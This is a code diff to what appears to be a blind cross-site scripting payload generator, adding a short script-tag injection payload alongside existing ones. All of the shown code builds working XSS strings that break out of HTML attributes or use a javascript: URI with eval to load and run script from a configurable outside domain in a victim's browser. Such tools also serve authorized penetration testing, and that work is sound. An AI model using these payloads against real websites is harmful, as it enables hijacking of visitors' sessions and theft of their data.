@@ -43,6 +43,11 @@ export default {
                     'description': 'Classic payload',
                 },
                 {
+                    'func': this.basicshort_script,
+                    'title': 'Basic Short <code>&lt;script&gt;</code> Tag Payload',
+                    'description': 'Classic payload',
+                },
+                {
                     'func': this.javascript_uri,
                     'title': '<code>javascript:</code> URI Payload',
                     'description': 'Link-based XSS',
@@ -89,6 +94,9 @@ export default {
         },
         basic_script: function() {
             return "\"><script src=\"https://" + this.base_domain + "\"><\/script>";
+        },
+        basicshort_script: function() {
+            return "\"';><script/src=\"//" + this.base_domain + "\"><\/script>";
         },
         javascript_uri: function() {
             return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + this.base_domain + "\\';document.body.appendChild(a)')";
